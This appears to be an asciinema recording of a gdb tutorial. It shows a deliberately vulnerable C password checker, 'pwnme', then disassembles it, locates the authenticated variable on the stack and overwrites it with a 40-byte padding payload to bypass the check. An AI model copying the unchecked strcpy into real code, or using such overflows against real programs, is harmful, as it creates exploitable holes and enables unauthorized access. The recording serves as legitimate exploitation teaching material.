{"version": 2, "width": 88, "height": 37, "timestamp": 1553620264, "env": {"SHELL": "/bin/bash", "TERM": "screen"}, "title": "gdb pwning"}
[0.050792, "o", "marco@testbed:~/gdb$ "]
[0.4727, "o", "\u001b[H\u001b[Jmarco@testbed:~/gdb$ "]
[1.873014, "o", "#"]
[1.974012, "o", " "]
[2.415588, "o", "Hi all, today we'll see how to use a debugger to analyze a binary \r application and exploit it!"]
[3.186553, "o", "\r\n"]
[3.186906, "o", "marco@testbed:~/gdb$ "]
[3.94412, "o", "c"]
[4.075474, "o", "a"]
[4.373703, "o", "t"]
[4.446027, "o", " "]
[4.842383, "o", "."]
[5.08352, "o", "p"]
[5.273395, "o", "w"]
[5.341527, "o", "n"]
[5.452859, "o", "\u0007"]
[6.027884, "o", "\b\u001b[K"]
[6.15506, "o", "\b\u001b[K"]
[6.298913, "o", "\b\u001b[K"]
[6.437126, "o", "\b\u001b[K"]
[6.522999, "o", "p"]
[6.61894, "o", "w"]
[6.719795, "o", "\u0007nme"]
[7.399499, "o", "."]
[7.465771, "o", "c"]
[7.631236, "o", " "]
[9.205687, "o", "\r\n"]
[9.208615, "o", "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <openssl/sha.h>\r\n\r\n#define MAGIC_VALUE 1337\r\n\r\nint\r\nmain(int argc, char *argv[]) {\r\n\tunsigned char correct_hash[20] = {\r\n\t\t0x4a, 0xc9, 0xb0, 0x57, 0xf8, 0x02, 0x12, 0x60, 0x6c, 0xea,\r\n\t\t0xab, 0xf3, 0xc6, 0x50, 0x5d, 0xaf, 0xed, 0x40, 0xa4, 0x50\r\n\t};\r\n\tchar password[20];\r\n\tint authenticated = 0;\r\n\r\n\tstrcpy(password, argv[1]);\r\n\tSHA1(password, strlen((char *)password), password);\r\n\tif(memcmp(password, correct_hash, 20) == 0) {\r\n\t\tauthenticated = MAGIC_VALUE;\r\n\t}\r\n\tprintf(\"Authenticated: %d\\n\", authenticated);\r\n\tif(authenticated == MAGIC_VALUE) {\r\n\t\tprintf(\"CORRECT PASSWORD!\\n\");\r\n\t} else {\r\n\t\tprintf(\"WRONG PASSWORD!\\n\");\r\n\t}\r\n\tfflush(stdout);\r\n\r\n\treturn 0;\r\n}\r\n"]
[9.209277, "o", "marco@testbed:~/gdb$ "]
[15.93945, "o", "#"]
[16.076597, "o", " "]
[16.207031, "o", "c"]
[16.54873, "o", "a"]
[16.755794, "o", "\b\u001b[K"]
[16.878472, "o", "\b\u001b[K"]
[17.392998, "o", "the program is similar to overshade, but in this case it takes a p\rpassword as a command line argument, copies the provided string into the array \"password\"\r\" and computes its SHA1 hash. Then, it compares this hash with the stored one and if they\ry are equivalent, the \"authenticated\" variable is set to \"1337\""]
[19.631462, "o", "\r\n"]
[19.632358, "o", "marco@testbed:~/gdb$ "]
[29.173422, "o", "#"]
[29.722511, "o", " "]
[30.713809, "o", "it turns out that if we manage to overwrite the authenticated vari\riable, we can make the program print \"CORRECT PASSWORD\""]
[33.464581, "o", "\r\n"]
[33.465223, "o", "marco@testbed:~/gdb$ "]
[35.151948, "o", "#"]
[35.427822, "o", " "]
[35.583719, "o", "l"]
[35.665467, "o", "e"]
[35.853979, "o", "t"]
[36.022639, "o", "'"]
[36.140791, "o", "s"]
[36.233069, "o", " "]
[36.498281, "o", "t"]
[36.638586, "o", "r"]
[36.825133, "o", "y"]
[36.889095, "o", " "]
[37.181669, "o", "s"]
[37.250016, "o", "o"]
[37.316153, "o", "m"]
[37.510148, "o", "e"]
[37.646435, "o", " "]
[37.94909, "o", "s"]
[38.04748, "o", "i"]
[38.138111, "o", "m"]
[38.297282, "o", "p"]
[38.365419, "o", "l"]
[38.436829, "o", "e"]
[38.54041, "o", " "]
[38.690365, "o", "o"]
[38.799084, "o", "v"]
[38.979603, "o", "e"]
[39.12111, "o", "r"]
[39.333374, "o", "f"]
[39.459666, "o", "l"]
[39.57454, "o", "o"]
[39.69818, "o", "w"]
[39.921708, "o", "s"]
[40.605775, "o", "!"]
[41.518274, "o", "\r\n"]
[41.518765, "o", "marco@testbed:~/gdb$ "]
[43.08654, "o", "."]
[43.170184, "o", "/"]
[43.465467, "o", "p"]
[43.586794, "o", "w"]
[43.695732, "o", "nme "]
[44.623057, "o", "A"]
[44.806734, "o", "A"]
[44.987238, "o", "A"]
[45.455519, "o", "A"]
[46.0222, "o", "\r\n"]
[46.025065, "o", "Authenticated: 0\r\nWRONG PASSWORD!\r\n"]
[46.02561, "o", "marco@testbed:~/gdb$ "]
[46.931846, "o", "."]
[47.005009, "o", "/"]
[47.322956, "o", "p"]
[47.433071, "o", "w"]
[47.5358, "o", "nme "]
[50.737242, "o", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"]
[51.15769, "o", "\r\n"]
[51.160647, "o", "Authenticated: 1094795585\r\nWRONG PASSWORD!\r\n"]
[51.161339, "o", "marco@testbed:~/gdb$ "]
[56.248343, "o", "./pwnme AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"]
[59.066921, "o", "A"]
[59.232456, "o", "A"]
[59.404501, "o", "A"]
[59.57283, "o", "A"]
[59.720616, "o", "A"]
[60.269757, "o", "\r\n"]
[60.272844, "o", "Authenticated: 1094795585\r\nWRONG PASSWORD!\r\n"]
[60.438043, "o", "Segmentation fault (core dumped)\r\n"]
[60.438372, "o", "marco@testbed:~/gdb$ "]
[73.328086, "o", "#"]
[73.574758, "o", " "]
[74.05521, "o", "in this case the program segfaults after our longer input, demonst\rtrating that there is a buffer overflow vulnerability"]
[80.918004, "o", "\r\n"]
[80.918949, "o", "marco@testbed:~/gdb$ "]
[89.042747, "o", "#"]
[89.666701, "o", " "]
[90.010221, "o", "let's try to analyze the stack. In this tutorial we use the Intel \r syntax in gdb"]
[93.248033, "o", "."]
[93.400155, "o", "."]
[93.57287, "o", "."]
[93.640742, "o", "\r\n"]
[93.641373, "o", "marco@testbed:~/gdb$ "]
[95.004558, "o", "c"]
[95.159716, "o", "a"]
[95.401925, "o", "t"]
[95.478, "o", " "]
[95.688221, "o", "."]
[95.844931, "o", "."]
[95.974684, "o", "/"]
[96.697396, "o", "."]
[97.033399, "o", "g"]
[97.3293, "o", "d"]
[97.413931, "o", "b"]
[97.541481, "o", "init "]
[98.231076, "o", "\r\n"]
[98.234025, "o", "set disassembly-flavor intel\r\n"]
[98.234682, "o", "marco@testbed:~/gdb$ "]
[101.747469, "o", "g"]
[102.067473, "o", "d"]
[102.15087, "o", "b"]
[102.290524, "o", " "]
[102.869026, "o", "-"]
[103.361543, "o", "q"]
[103.587597, "o", " "]
[103.943548, "o", "."]
[103.988924, "o", "/"]
[104.248248, "o", "p"]
[104.335705, "o", "w"]
[104.424534, "o", "\u0007"]
[105.326462, "o", "n"]
[105.411829, "o", "\u0007"]
[106.647071, "o", "m"]
[106.712376, "o", "e"]
[107.776008, "o", "\r\n"]
[107.876569, "o", "Reading symbols from ./pwnme..."]
[107.877384, "o", "(no debugging symbols found)...done.\r\n"]
[107.877816, "o", "(gdb) "]
[115.974235, "o", "#"]
[116.120596, "o", " "]
[116.664786, "o", "we use disas to see the assembly code of the main function"]
[118.015573, "o", "\r\n"]
[118.015734, "o", "(gdb) "]
[121.299633, "o", "d"]
[121.44437, "o", "i"]
[121.547424, "o", "s"]
[121.673439, "o", "a"]
[122.326327, "o", "s"]
[122.561654, "o", " "]
[122.72744, "o", "m"]
[122.842598, "o", "a"]
[123.047326, "o", "in"]
[123.841128, "o", "\r\n"]
[123.841871, "o", "Dump of assembler code for function main:\r\n"]
[123.842306, "o", "   0x080485b6 <+0>:\tlea    ecx,[esp+0x4]\r\n"]
[123.842407, "o", "   0x080485ba <+4>:\tand    esp,0xfffffff0\r\n   0x080485bd <+7>:\tpush   DWORD PTR [ecx-0x4]\r\n"]
[123.842899, "o", "   0x080485c0 <+10>:\tpush   ebp\r\n   0x080485c1 <+11>:\tmov    ebp,esp\r\n   0x080485c3 <+13>:\t"]
[123.843002, "o", "push   ebx\r\n   0x080485c4 <+14>:\tpush   ecx\r\n   0x080485c5 <+15>:"]
[123.843457, "o", "\tsub    esp,0x30\r\n   0x080485c8 <+18>:\tcall   0x80484f0 <__x86.get_pc_thunk.bx>"]
[123.843548, "o", "\r\n   0x080485cd <+23>:\tadd    ebx,0x1a33\r\n   0x080485d3 <+29>:"]
[123.843992, "o", "\t"]
[123.844091, "o", "mov    eax,ecx\r\n   0x080485d5 <+31>:\t"]
[123.844593, "o", "mov    BYTE PTR [ebp-0x20],0x4a\r\n   0x080485d9 <+35>:\tmov    BYTE PTR [ebp-0x1f],0xc9\r\n   0x080485dd <+39>:\tmov    BYTE PTR [ebp-0x1e],0xb0\r\n"]
[123.844709, "o", "   0x080485e1 <+43>:"]
[123.845242, "o", "\tmov    BYTE PTR [ebp-0x1d],0x57\r\n   0x080485e5 <+47>:\tmov    BYTE PTR [ebp-0x1c],0xf8\r\n"]
[123.845341, "o", "   0x080485e9 <+51>:"]
[123.845831, "o", "\tmov    BYTE PTR [ebp-0x1b],0x2\r\n   0x080485ed <+55>:\tmov    BYTE PTR [ebp-0x1a],0x12\r\n   0x080485f1 <+59>:\tmov    BYTE PTR [ebp-0x19],0x60\r\n   0x080485f5 <+63>:\tmov    BYTE PTR [ebp-0x18],0x6c\r\n"]
[123.845935, "o", "   0x080485f9 <+67>:\tmov    BYTE PTR [ebp-0x17],0xea\r\n   0x080485fd <+71>:\tmov    BYTE PTR [ebp-0x16],0xab\r\n"]
[123.846502, "o", "   0x08048601 <+75>:\tmov    BYTE PTR [ebp-0x15],0xf3\r\n   0x08048605 <+79>:\t"]
[123.8466, "o", "mov    BYTE PTR [ebp-0x14],0xc6\r\n   0x08048609 <+83>:\tmov    BYTE PTR [ebp-0x13],0x50\r\n   0x0804860d <+87>:"]
[123.847056, "o", "\tmov    BYTE PTR [ebp-0x12],0x5d\r\n"]
[123.847151, "o", "   0x08048611 <+91>:\tmov    BYTE PTR [ebp-0x11],0xaf\r\n   0x08048615 <+95>:\tmov    BYTE PTR [ebp-0x10],0xed\r\n"]
[123.847619, "o", "   0x08048619 <+99>:\tmov    BYTE PTR [ebp-0xf],0x40\r\n"]
[123.847717, "o", "   0x0804861d <+103>:\tmov    BYTE PTR [ebp-0xe],0xa4\r\n   0x08048621 <+107>:\tmov    BYTE PTR [ebp-0xd],0x50"]
[123.84817, "o", "\r\n   0x08048625 <+111>:\tmov    DWORD PTR [ebp-0xc],0x0\r\n   0x0804862c <+118>:\tmov    eax,DWORD PTR [eax+0x4]\r\n   0x0804862f <+121>:"]
[123.848259, "o", "\tadd    eax,0x4\r\n   0x08048632 <+124>:\t"]
[123.84833, "o", "mov    eax,DWORD PTR [eax]"]
[123.848887, "o", "\r\n---Type <return> to continue, or q <return> to quit---"]
[127.020596, "o", "\r\n"]
[127.02126, "o", "   0x08048634 <+126>:\tsub    esp,0x8\r\n   0x08048637 <+129>:\tpush   eax\r\n   0x08048638 <+130>:\tlea    eax,[ebp-0x34]\r\n   0x0804863b <+133>:\tpush   eax\r\n   0x0804863c <+134>:\tcall   0x8048460 <strcpy@plt>\r\n   0x08048641 <+139>:\tadd    esp,0x10\r\n   0x08048644 <+142>:\tsub    esp,0xc\r\n   0x08048647 <+145>:\tlea    eax,[ebp-0x34]\r\n   0x0804864a <+148>:\tpush   eax\r\n   0x0804864b <+149>:\tcall   0x8048450 <strlen@plt>\r\n   0x08048650 <+154>:\tadd    esp,0x10\r\n   0x08048653 <+157>:\tmov    edx,eax\r\n   0x08048655 <+159>:\tsub    esp,0x4\r\n"]
[127.022315, "o", "   0x08048658 <+162>:\tlea    eax,[ebp-0x34]\r\n   0x0804865b <+165>:\tpush   eax\r\n   0x0804865c <+166>:\tpush   edx\r\n"]
[127.022737, "o", "   0x0804865d <+167>:\tlea    eax,[ebp-0x34]\r\n   0x08048660 <+170>:\tpush   eax\r\n   0x08048661 <+171>:\tcall   0x8048440 <SHA1@plt>\r\n   0x08048666 <+176>:\tadd    esp,0x10\r\n   0x08048669 <+179>:\tsub    esp,0x4\r\n   0x0804866c <+182>:\tpush   0x14\r\n   0x0804866e <+184>:\tlea    eax,[ebp-0x20]\r\n   0x08048671 <+187>:\tpush   eax\r\n   0x08048672 <+188>:\tlea    eax,[ebp-0x34]\r\n   0x08048675 <+191>:"]
[127.023146, "o", "\tpush   eax\r\n   0x08048676 <+192>:\tcall   0x8048410 <memcmp@plt>\r\n   0x0804867b <+197>:\tadd    esp,0x10\r\n"]
[127.023481, "o", "   0x0804867e <+200>:\ttest   eax,eax\r\n   0x08048680 <+202>:"]
[127.023801, "o", "\tjne    0x8048689 <main+211>\r\n   0x08048682 <+204>:"]
[127.024124, "o", "\tmov    DWORD PTR [ebp-0xc],0x539\r\n   0x08048689 <+211>:\tsub    esp,0x8\r\n   0x0804868c <+214>:"]
[127.024438, "o", "\tpush   DWORD PTR [ebp-0xc]\r\n   0x0804868f <+217>:\tlea    eax,[ebx-0x1890]\r\n   0x08048695 <+223>:\tpush   eax\r\n   0x08048696 <+224>:\tcall   0x8048470 <printf@plt>\r\n"]
[127.025087, "o", "---Type <return> to continue, or q <return> to quit---"]
[131.53484, "o", "\r\n"]
[131.535567, "o", "   0x0804869b <+229>:\tadd    esp,0x10\r\n   0x0804869e <+232>:\tcmp    DWORD PTR [ebp-0xc],0x539\r\n   0x080486a5 <+239>:\tjne    0x80486bb <main+261>\r\n   0x080486a7 <+241>:\tsub    esp,0xc\r\n   0x080486aa <+244>:\tlea    eax,[ebx-0x187d]\r\n   0x080486b0 <+250>:\tpush   eax\r\n   0x080486b1 <+251>:\tcall   0x8048480 <puts@plt>\r\n   0x080486b6 <+256>:\tadd    esp,0x10\r\n   0x080486b9 <+259>:\tjmp    0x80486cd <main+279>\r\n   0x080486bb <+261>:\tsub    esp,0xc\r\n   0x080486be <+264>:\tlea    eax,[ebx-0x186b]\r\n   0x080486c4 <+270>:\tpush   eax\r\n   0x080486c5 <+271>:\tcall   0x8048480 <puts@plt>\r\n   0x080486ca <+276>:\tadd    esp,0x10\r\n   0x080486cd <+279>:\tmov    eax,DWORD PTR [ebx-0x4]\r\n"]
[131.53668, "o", "   0x080486d3 <+285>:\tmov    eax,DWORD PTR [eax]\r\n   0x080486d5 <+287>:\tsub    esp,0xc\r\n   0x080486d8 <+290>:\tpush   eax\r\n   0x080486d9 <+291>:\tcall   0x8048430 <fflush@plt>\r\n   0x080486de <+296>:\tadd    esp,0x10\r\n   0x080486e1 <+299>:\tmov    eax,0x0\r\n   0x080486e6 <+304>:\tlea    esp,[ebp-0x8]\r\n   0x080486e9 <+307>:\tpop    ecx\r\n   0x080486ea <+308>:\tpop    ebx\r\n   0x080486eb <+309>:\tpop    ebp\r\n   0x080486ec <+310>:\tlea    esp,[ecx-0x4]\r\n   0x080486ef <+313>:\tret    \r\nEnd of assembler dump.\r\n(gdb) "]
[140.878003, "o", "#"]
[141.286594, "o", " "]
[141.822132, "o", "we see that at 0x0804869e the program compares the authenticated variable with th\rhe expected value 1337"]
[144.161969, "o", "\r\n(gdb) "]
[149.940142, "o", "x/i 0x0804869e"]
[150.523075, "o", "\r\n   0x804869e <main+232>:\tcmp    DWORD PTR [ebp-0xc],0x539\r\n(gdb) "]
[158.683456, "o", "#"]
[158.949417, "o", " "]
[159.365928, "o", "we set a breakpoint after the strcpy function and then we try to perform an overf\rflow"]
[160.838531, "o", "\r\n"]
[160.839231, "o", "(gdb) "]
[165.325006, "o", "b *0x08048647"]
[166.085954, "o", "\r\n"]
[166.086789, "o", "Breakpoint 1 at 0x8048647\r\n"]
[166.087364, "o", "(gdb) "]
[175.4833, "o", "r $(python -c 'print(\"A\"*20)')"]
[177.166628, "o", "\r\n"]
[177.167423, "o", "Starting program: /home/marco/gdb/pwnme $(python -c 'print(\"A\"*20)')\r\n"]
[177.304205, "o", "\r\n"]
[177.304725, "o", "Breakpoint 1, 0x08048647 in main ()\r\n"]
[177.305082, "o", "(gdb) "]
[183.707324, "o", "x/40wx $esp"]
[184.289366, "o", "\r\n"]
[184.29028, "o", "0xffffd624:\t0xffffd84c\t0xf7c284a9\t0x080485cd\t0xf7dd0000\r\n"]
[184.290793, "o", "0xffffd634:\t0x41414141\t0x41414141\t0x41414141\t0x41414141\r\n"]
[184.291274, "o", "0xffffd644:\t0x41414141\t0x57b0c900\t0x601202f8\t0xf3abea6c\r\n"]
[184.291726, "o", "0xffffd654:\t0xaf5d50c6\t0x50a440ed\t0x00000000\t0xffffd680\r\n"]
[184.292174, "o", "0xffffd664:\t0x00000000\t0x00000000\t0xf7c10e81\t0xf7dd0000\r\n"]
[184.292621, "o", "0xffffd674:\t0xf7dd0000\t0x00000000\t0xf7c10e81\t0x00000002\r\n"]
[184.293113, "o", "0xffffd684:\t0xffffd714\t0xffffd720\t0xffffd6a4\t0x00000001\r\n"]
[184.29357, "o", "0xffffd694:\t0x00000000\t0xf7dd0000\t0xf7fe575a\t0xf7ffd000\r\n"]
[184.294039, "o", "0xffffd6a4:\t0x00000000\t0xf7dd0000\t0x00000000\t0x00000000\r\n"]
[184.294482, "o", "0xffffd6b4:\t0x3c090f19\t0x41b88909\t0x00000000\t0x00000000\r\n"]
[184.294977, "o", "(gdb) "]
[191.46579, "o", "#"]
[191.811274, "o", " "]
[192.191142, "o", "we can now see that are 20 'A's are on the stack, starting from"]
[193.777303, "o", "\r\n"]
[193.777486, "o", "(gdb) "]
[197.948044, "o", "x/wx 0xffffd644"]
[198.558411, "o", "\r\n"]
[198.559139, "o", "0xffffd644:\t0x41414141\r\n"]
[198.559246, "o", "(gdb) "]
[201.673538, "o", "x/wx 0xffffd644"]
[202.653728, "o", "\b"]
[203.022573, "o", "\u001b[K\b"]
[203.599634, "o", "34\b"]
[205.353121, "o", "\r\n"]
[205.353796, "o", "0xffffd634:\t0x41414141\r\n(gdb) "]
[208.485434, "o", "x/wx 0xffffd634"]
[209.251276, "o", " "]
[209.885649, "o", "<"]
[210.194695, "o", "-"]
[210.298241, "o", " "]
[210.596617, "o", "t"]
[210.698818, "o", "h"]
[210.744949, "o", "i"]
[210.87451, "o", "s"]
[210.929854, "o", " "]
[211.263507, "o", "i"]
[211.317373, "o", "s"]
[211.399602, "o", " "]
[211.770146, "o", "t"]
[211.883308, "o", "h"]
[212.009457, "o", "e"]
[212.089445, "o", " "]
[212.263603, "o", "s"]
[212.473165, "o", "t"]
[212.650863, "o", "a"]
[212.863152, "o", "r"]
[212.999421, "o", "t"]
[213.135369, "o", "i"]
[213.196214, "o", "n"]
[213.276352, "o", "g"]
[213.323392, "o", " "]
[213.88777, "o", "a"]
[214.185022, "o", "d"]
[214.317136, "o", "d"]
[214.474696, "o", "r"]
[214.655261, "o", "e"]
[214.900057, "o", "s"]
[215.051306, "o", "s"]
[215.152289, "o", " "]
[218.326116, "o", "\r\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C"]
[219.060052, "o", "\u001b[1@#"]
[219.30916, "o", "\u001b[1@ "]
[219.575688, "o", "\r\n"]
[219.576137, "o", "(gdb) "]
[237.554762, "o", "#"]
[237.896797, "o", " "]
[239.49484, "o", "we know that we need to overflow until the address of the authenticated variable \r"]
[242.079536, "o", "\u001bM\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[Ke\r\n"]
[242.08029, "o", "(gdb) "]
[247.173294, "o", "p $ebp-0xc"]
[248.166573, "o", "\r\n"]
[248.167744, "o", "$1 = (void *) 0xffffd65c\r\n"]
[248.168036, "o", "(gdb) "]
[260.867778, "o", "#"]
[261.241546, "o", " "]
[261.583043, "o", "so we can calculate the length of our payload: 40 bytes of padding ('A's) followe\red by 1337 (0x539 in hex) represented as 2 bytes in reverse order (because of little-endi\rianess)"]
[263.239742, "o", "\r\n"]
[263.240273, "o", "(gdb) "]
[266.509612, "o", "p"]
[266.822789, "o", " "]
[269.278957, "o", "0xffffd65c"]
[269.776291, "o", " "]
[270.112715, "o", "-"]
[270.179595, "o", " "]
[273.470746, "o", "0xffffd634"]
[274.24948, "o", "\r\n"]
[274.250323, "o", "$2 = 40\r\n"]
[274.250646, "o", "(gdb) "]
[283.585428, "o", "r $(python -c 'print(\"A\"*40 + \"\\x39\\x05\")')"]
[287.219216, "o", "\r\n"]
[287.220159, "o", "The program being debugged has been started already.\r\nStart it from the beginning? (y or n) "]
[288.744105, "o", "y"]
[290.49908, "o", "\r\n"]
[290.50054, "o", "Starting program: /home/marco/gdb/pwnme $(python -c 'print(\"A\"*40 + \"\\x39\\x05\")')\r\n"]
[290.62856, "o", "\r\nBreakpoint 1, 0x08048647 in main ()\r\n(gdb) "]
[292.001239, "o", "c"]
[292.83951, "o", "\r\n"]
[292.83983, "o", "Continuing.\r\n"]
[292.840717, "o", "Authenticated: 1337\r\nCORRECT PASSWORD!\r\n"]
[292.841232, "o", "[Inferior 1 (process 9786) exited normally]\r\n"]
[292.841509, "o", "(gdb) "]
[294.767068, "o", "#"]
[294.893365, "o", " "]
[295.394612, "o", "Y"]
[295.497583, "o", "A"]
[295.601624, "o", "Y"]
[296.055121, "o", "!"]
[296.844766, "o", "\r\n"]
[296.845143, "o", "(gdb) "]
[300.714346, "o", "quit\r\n"]
[300.731241, "o", "marco@testbed:~/gdb$ "]
[301.853789, "o", "exit\r\n"]
